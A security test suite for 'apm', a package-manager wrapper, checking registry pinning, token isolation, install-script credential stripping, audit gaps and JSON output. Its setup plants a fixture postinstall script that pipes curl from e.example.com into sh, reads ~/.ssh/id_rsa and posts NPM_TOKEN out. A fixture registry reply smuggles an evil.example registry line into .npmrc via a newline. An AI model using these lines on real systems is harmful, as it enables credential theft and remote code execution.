// Spec: apm only vouches for what it checked. The package manager installs and publishes against the
// registry apm checked, credentials never reach a registry a repo picked or the scripts a package runs,
// audit says what it could not see, and --json always prints one document.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync, writeFileSync, readFileSync, existsSync, mkdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { z } from "zod";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, run, apm, getJson, hostKey, dig, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
const PASSWORD = "correct-horse-battery";
let clock = Date.parse("2026-07-01T00:00:00Z");
let reg: Registry;
let other: Registry;
let alice: string;
let mallory: string;
let work: string;

type Seen = { method: string; path: string; auth: string | null };

/** A registry stand-in that records every request and answers with `answer` (404 by default). */
function standIn(answer: (req: Request, path: string) => Response | null = () => null) {
  const seen: Seen[] = [];

  const server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req) {
      const path = new URL(req.url).pathname;

      seen.push({ method: req.method, path, auth: req.headers.get("authorization") });

      return answer(req, path) ?? Response.json({ error: "not found" }, { status: 404 });
    },
  });

  return { url: server.url.toString(), seen, stop: () => server.stop(true) };
}

async function publishTo(target: Registry, name: string, version: string, token: string, extra: Partial<Parameters<typeof writePackage>[1]> = {}): Promise<void> {
  const sb = makeSandbox(target, token);
  const d = writePackage(work, { name, version, ...extra }, target, token);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });

  if (r.code !== 0) throw new Error(`publish ${name}@${version} failed: ${r.out}`);
}

/** The sandbox env without the registry variables, so the project's own .npmrc decides, as on a laptop. */
function laptopEnv(env: Record<string, string>): Record<string, string> {
  const { APM_REGISTRY: _a, npm_config_registry: _n, APM_TOKEN: _t, ...rest } = env;

  return rest;
}

async function revoke(name: string, version: string, token: string, reason: string): Promise<void> {
  const rv = await fetch(`${reg.url}-/apm/v1/revoke`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
    body: JSON.stringify({ name, version, reason, password: PASSWORD }),
  });

  if (rv.status !== 200) throw new Error(`revoke failed: ${rv.status} ${await rv.text()}`);
}

const JsonDoc = z.object({ ok: z.boolean() }).loose();

/** The one JSON document a --json command printed. */
function oneJson(stdout: string): z.infer<typeof JsonDoc> {
  const lines = stdout.trim().split("\n");

  expect(lines.length, stdout).toBe(1);

  return JsonDoc.parse(JSON.parse(lines[0] ?? ""));
}

async function scopedNpmrcCase(pm: "bun" | "npm" | "pnpm"): Promise<void> {
  const sb = makeSandbox(reg, alice);
  const app = writeConsumer(work, reg, alice);

  writeFileSync(join(app, ".npmrc"), `registry=${reg.url}\n${hostKey(reg.url)}:_authToken=${alice}\n@alice:registry=${other.url}\n`);
  const r = await apm(["add", "@alice/p", "--pm", pm], { cwd: app, env: { ...sb.env, npm_config_store_dir: join(sb.home, ".pnpm-store") } });
  const installed = join(app, "node_modules", "@alice", "p", "index.js");

  expect(existsSync(installed) ? readFileSync(installed, "utf8") : "").not.toContain("EVIL-UNCHECKED-CONTENT");
  expect(r.code, r.out).not.toBe(0);
  expect(r.out).toContain(other.url);
}

async function pinnedLockfileCase(pm: "bun" | "pnpm"): Promise<void> {
  const sb = makeSandbox(reg, alice);
  const app = writeConsumer(work, reg, alice);
  const env = { ...sb.env, npm_config_store_dir: join(sb.home, ".pnpm-store") };

  // a lockfile committed by someone whose config sent @alice elsewhere
  writeFileSync(join(app, ".npmrc"), `registry=${reg.url}\n${hostKey(reg.url)}:_authToken=${alice}\n@alice:registry=${other.url}\n`);
  const first = await run([pm, "add", "@alice/p@1.0.0"], { cwd: app, env });

  expect(first.code, first.out).toBe(0);
  writeFileSync(join(app, ".npmrc"), `registry=${reg.url}\n${hostKey(reg.url)}:_authToken=${alice}\n`);
  rmSync(join(app, "node_modules"), { recursive: true, force: true });
  const r = await apm(["add", "@alice/p@1.0.0", "--pm", pm], { cwd: app, env });
  const installed = join(app, "node_modules", "@alice", "p", "index.js");

  expect(r.code, r.out).not.toBe(0);
  expect(r.out).toContain("lockfile");
  expect(existsSync(installed) ? readFileSync(installed, "utf8") : "").not.toContain("EVIL-UNCHECKED-CONTENT");
}

async function publishTargetCase(pm: "bun" | "npm"): Promise<void> {
  const spy = standIn();
  const sb = makeSandbox(reg, alice);
  const name = `pub-target-${pm}`;
  const d = writePackage(work, { name, version: "1.0.0" }, reg, alice);

  writeFileSync(join(d, ".npmrc"), `registry=${spy.url}\n${hostKey(reg.url)}:_authToken=${alice}\n${hostKey(spy.url)}:_authToken=${alice}\n`);
  writeFileSync(join(d, "bunfig.toml"), `[install]\nregistry = "${spy.url}"\n`);
  const r = await apm(["publish", "--pm", pm], { cwd: d, env: { ...laptopEnv(sb.env), APM_REGISTRY: reg.url } });

  await spy.stop();
  expect(spy.seen.filter((s) => s.method === "PUT")).toEqual([]);
  expect(r.code, r.out).toBe(0);
  const { body } = await getJson(`${reg.url}${name}`);

  expect(dig(body, "dist-tags", "latest")).toBe("1.0.0");
}

beforeAll(async () => {
  reg = await startRegistry({ now: () => clock });
  other = await startRegistry({ now: () => clock });
  alice = await addUser(reg, "alice", PASSWORD);
  mallory = await addUser(reg, "mallory", PASSWORD);
  work = mkdtempSync(join(tmpdir(), "apm-harden-"));
  await publishTo(reg, "@alice/p", "1.0.0", alice, { files: { "index.js": 'module.exports = "checked";\n' } });
  await publishTo(reg, "hard-nice", "1.0.0", alice);
  await publishTo(reg, "hard-gone", "1.0.0", alice);
  await publishTo(reg, "hard-store", "1.0.0", alice);
  await publishTo(reg, "hard-evil", "1.0.0", mallory, {
    scripts: { postinstall: "node x.js" },
    files: { "index.js": "module.exports=1;\n", "x.js": "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.ssh/id_rsa'); fetch('https://e.example.com',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n" },
  });
  await publishTo(reg, "hard-wrapper", "1.0.0", alice, { dependencies: { "hard-evil": "1.0.0" } });
  await publishTo(reg, "env-dumper", "1.0.0", alice, {
    scripts: { postinstall: "node dump.js" },
    files: { "index.js": "module.exports=1;\n", "dump.js": "require('fs').writeFileSync(process.env.APM_TEST_DUMP, JSON.stringify(process.env));\n" },
  });
  const otherUser = await addUser(other, "alice", PASSWORD);

  await publishTo(other, "@alice/p", "1.0.0", otherUser, { files: { "index.js": 'module.exports = "EVIL-UNCHECKED-CONTENT";\n' } });
  clock += 10 * DAY;
});

afterAll(async () => {
  await reg?.stop();
  await other?.stop();
});

describe("finding 1: the package manager installs what apm checked", () => {
  test("a project .npmrc that sends a scope to another registry is refused (bun)", () => scopedNpmrcCase("bun"));
  test("a project .npmrc that sends a scope to another registry is refused (npm)", () => scopedNpmrcCase("npm"));
  test("a project .npmrc that sends a scope to another registry is refused (pnpm)", () => scopedNpmrcCase("pnpm"));

  test("a bunfig [install.scopes] entry for another registry is refused", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);

    writeFileSync(join(app, "bunfig.toml"), `[install]\nregistry = "${reg.url}"\n\n[install.scopes]\n"@alice" = "${other.url}"\n`);
    const r = await apm(["add", "@alice/p"], { cwd: app, env: sb.env });

    expect(r.code, r.out).not.toBe(0);
    expect(existsSync(join(app, "node_modules", "@alice", "p"))).toBe(false);
  });

  test("a bun lockfile that pins the version to another registry's tarball is refused before install", () => pinnedLockfileCase("bun"));
  test("a pnpm lockfile that pins the version to another registry's tarball is refused before install", () => pinnedLockfileCase("pnpm"));
});

describe("finding 2: APM_TOKEN only goes to the registry it was issued for", () => {
  test("a project .npmrc naming another registry does not receive APM_TOKEN", async () => {
    const spy = standIn();
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg);

    writeFileSync(join(app, ".npmrc"), `registry=${spy.url}\n`);
    const env = { ...laptopEnv(sb.env), APM_TOKEN: "apm_SECRET_CANARY_TOKEN_1234567890" };
    const score = await apm(["score", "leakpkg"], { cwd: app, env });
    const add = await apm(["add", "leakpkg"], { cwd: app, env });

    await spy.stop();
    expect(spy.seen.length, `${score.out}\n${add.out}`).toBeGreaterThan(0);
    expect(spy.seen.filter((s) => (s.auth ?? "").includes("CANARY"))).toEqual([]);
    expect(score.out).toContain("APM_TOKEN");
  });

  test("APM_TOKEN still goes to the registry in the user config", async () => {
    const sb = makeSandbox(reg, alice);
    const r = await apm(["whoami"], { cwd: sb.home, env: { ...laptopEnv(sb.env), APM_TOKEN: alice } });

    expect(r.code, r.out).toBe(0);
    expect(r.out).toContain("alice");
  });
});

describe("finding 3: apm publish uploads to the registry it checked", () => {
  test("a project .npmrc and bunfig naming another registry do not redirect the upload (bun)", () => publishTargetCase("bun"));
  test("a project .npmrc and bunfig naming another registry do not redirect the upload (npm)", () => publishTargetCase("npm"));

  test("publishConfig.registry pointing elsewhere is refused before any upload", async () => {
    const spy = standIn();
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "pub-config-elsewhere", version: "1.0.0", extra: { publishConfig: { registry: spy.url } } }, reg, alice);
    const r = await apm(["publish"], { cwd: d, env: sb.env });

    await spy.stop();
    expect(r.code, r.out).not.toBe(0);
    expect(r.out).toContain("publishConfig");
    expect(spy.seen.filter((s) => s.method === "PUT")).toEqual([]);
  });
});

describe("finding 4: install scripts never see registry credentials", () => {
  test("a postinstall script run through apm add does not get APM_TOKEN, NPM_TOKEN or NODE_AUTH_TOKEN", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);
    const dump = join(work, `env-dump-${Date.now()}.json`);
    const env = { ...sb.env, NPM_TOKEN: "npm_CANARY_NPM", NODE_AUTH_TOKEN: "CANARY_NODE_AUTH", "npm_config_//canary.example/:_authToken": "CANARY_NPMRC_ENV", APM_TEST_DUMP: dump };
    const r = await apm(["add", "env-dumper", "--pm", "npm", "--force"], { cwd: app, env });

    expect(r.code, r.out).toBe(0);
    expect(existsSync(dump), r.out).toBe(true);
    const seen = readFileSync(dump, "utf8");

    expect(seen).not.toContain(alice);
    expect(seen).not.toContain("CANARY");
    expect(seen).toContain(dump); // the script did run with the rest of the env
  });
});

describe("finding 5: apm audit sees pnpm's store and reports what it could not check", () => {
  test("a revoked version that only sits in node_modules/.pnpm is found", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);
    const top = join(app, "node_modules", "hard-nice");
    const stored = join(app, "node_modules", ".pnpm", "hard-store@1.0.0", "node_modules", "hard-store");

    mkdirSync(top, { recursive: true });
    mkdirSync(stored, { recursive: true });
    writeFileSync(join(top, "package.json"), JSON.stringify({ name: "hard-nice", version: "1.0.0" }));
    writeFileSync(join(stored, "package.json"), JSON.stringify({ name: "hard-store", version: "1.0.0" }));
    await revoke("hard-store", "1.0.0", alice, "pnpm store canary");
    const r = await apm(["audit", "--json"], { cwd: app, env: sb.env });
    const body = oneJson(r.stdout);

    expect(dig(body, "ok")).toBe(false);
    expect(JSON.stringify(dig(body, "findings"))).toContain("hard-store@1.0.0");
    expect(r.code).not.toBe(0);
  });

  test("a package store apm cannot read is reported as unchecked, not ok", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);

    mkdirSync(join(app, "node_modules", "hard-nice"), { recursive: true });
    writeFileSync(join(app, "node_modules", "hard-nice", "package.json"), JSON.stringify({ name: "hard-nice", version: "1.0.0" }));
    mkdirSync(join(app, "node_modules", ".mystery-store", "blob"), { recursive: true });
    const r = await apm(["audit", "--json"], { cwd: app, env: sb.env });
    const body = oneJson(r.stdout);

    expect(dig(body, "ok")).toBe(false);
    expect(JSON.stringify(dig(body, "unchecked"))).toContain(".mystery-store");
  });
});

describe("finding 9: apm login only saves a well-formed token", () => {
  test("a registry answer with a newline in the token writes nothing to .npmrc", async () => {
    const evil = standIn((req, path) => (req.method === "PUT" && path.startsWith("/-/user/") ? Response.json({ ok: true, token: "apm_abcdefghijklmnopqrstuv\nregistry=http://evil.example/\n//evil.example/:_authToken=stolen" }, { status: 201 }) : null));
    const sb = makeSandbox(reg);
    const before = readFileSync(join(sb.home, ".npmrc"), "utf8");
    const r = await apm(["login", "--username", "dave", "--password-stdin"], { cwd: sb.home, env: { ...sb.env, APM_REGISTRY: evil.url }, stdin: "a-long-enough-password\n" });

    await evil.stop();
    expect(readFileSync(join(sb.home, ".npmrc"), "utf8")).toBe(before);
    expect(r.code, r.out).not.toBe(0);
  });
});

describe("finding 10: --force advice is accurate and never skips the dependency check", () => {
  test("an unknown package is not told to use --force", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);
    const r = await apm(["add", "no-such-package-anywhere"], { cwd: app, env: sb.env });

    expect(r.code).not.toBe(0);
    expect(r.out).not.toContain("To install anyway");
  });

  test("a revoked version is not told to use --force", async () => {
    await revoke("hard-gone", "1.0.0", alice, "gone for good");
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);
    const r = await apm(["add", "hard-gone@1.0.0"], { cwd: app, env: sb.env });

    expect(r.code).not.toBe(0);
    expect(r.out).not.toContain("To install anyway");
    const forced = await apm(["add", "hard-gone@1.0.0", "--force"], { cwd: app, env: sb.env });

    expect(forced.code).not.toBe(0);
  });

  // strict mode, where a dangerous dependency refuses: --force lifts the named package's floor only
  test("--force on a package with a dangerous dependency still refuses and names the dependency", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);
    const r = await apm(["add", "hard-wrapper", "--force", "--strict"], { cwd: app, env: sb.env });

    expect(r.code, r.out).not.toBe(0);
    expect(r.out).toContain("hard-evil");
    expect(existsSync(join(app, "node_modules", "hard-evil"))).toBe(false);
  });
});

describe("finding 11: every apm command prints one JSON document with --json", () => {
  test("yank, revoke, whoami, incident, login, publish, audit and add print JSON", async () => {
    await publishTo(reg, "json-pkg", "1.0.0", alice);
    await publishTo(reg, "json-pkg", "1.0.1", alice);
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);
    const opts = { cwd: app, env: sb.env };
    const yank = await apm(["yank", "json-pkg@1.0.0", "--reason", "test", "--json"], opts);

    expect(dig(oneJson(yank.stdout), "status")).toBe("yanked");
    const revoked = await apm(["revoke", "json-pkg@1.0.1", "--reason", "test", "--password-stdin", "--json"], { ...opts, stdin: `${PASSWORD}\n` });

    expect(dig(oneJson(revoked.stdout), "ok"), revoked.out).toBe(true);
    const who = await apm(["whoami", "--json"], opts);

    expect(dig(oneJson(who.stdout), "username")).toBe("alice");
    const incident = await apm(["incident", "--since", new Date(clock - DAY).toISOString(), "--dry-run", "--password-stdin", "--json"], { ...opts, stdin: `${PASSWORD}\n` });

    expect(dig(oneJson(incident.stdout), "dryRun"), incident.out).toBe(true);
    const fresh = makeSandbox(reg);
    const login = await apm(["login", "--username", "erin", "--password-stdin", "--json"], { cwd: fresh.home, env: fresh.env, stdin: "a-long-enough-password\n" });

    expect(dig(oneJson(login.stdout), "username"), login.out).toBe("erin");
    const d = writePackage(work, { name: "json-pub", version: "1.0.0" }, reg, alice);
    const dry = await apm(["publish", "--dry-run", "--json"], { cwd: d, env: sb.env });

    expect(dig(oneJson(dry.stdout), "status")).toBe("dry-run");
    const pub = await apm(["publish", "--json"], { cwd: d, env: sb.env });

    expect(dig(oneJson(pub.stdout), "status"), pub.out).toBe("published");
    const empty = await apm(["audit", "--json"], opts);

    expect(dig(oneJson(empty.stdout), "ok")).toBe(true);
    const bare = await apm(["add", "--json"], opts);

    expect(dig(oneJson(bare.stdout), "ok"), bare.out).toBe(true);
    const bad = await apm(["yank", "json-pkg@9.9.9", "--json"], opts);

    expect(dig(oneJson(bad.stdout), "ok")).toBe(false);
  });
});

describe("finding 12: apm audit does not match on malformed advisory ranges", () => {
  test("an unparseable vulnerable_versions is reported as unchecked, a valid one still matches", async () => {
    const fake = standIn((req, path) => {
      const advisories = {
        "hard-nice": [{ title: "garbage range", severity: "high", vulnerable_versions: ">>>" }],
        "hard-store": [{ title: "real advisory", severity: "moderate", vulnerable_versions: ">=1.0.0 <1.0.5" }],
      };

      if (path === "/-/apm/v1/audit") return Response.json({ advisories, unavailable: [] });

      if (path === "/-/npm/v1/security/advisories/bulk") return Response.json(advisories);

      if (path === "/-/apm/v1/scan") return Response.json({ advisories: [], unchecked: [] });

      return null;
    });

    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice);

    for (const name of ["hard-nice", "hard-store"]) {
      mkdirSync(join(app, "node_modules", name), { recursive: true });
      writeFileSync(join(app, "node_modules", name, "package.json"), JSON.stringify({ name, version: "1.0.0" }));
    }

    const r = await apm(["audit", "--json"], { cwd: app, env: { ...sb.env, APM_REGISTRY: fake.url } });

    await fake.stop();
    const body = oneJson(r.stdout);
    const findings = JSON.stringify(dig(body, "findings"));

    expect(findings).not.toContain("hard-nice");
    expect(findings).toContain("hard-store@1.0.0");
    expect(JSON.stringify(dig(body, "unchecked"))).toContain("garbage range");
  });
});
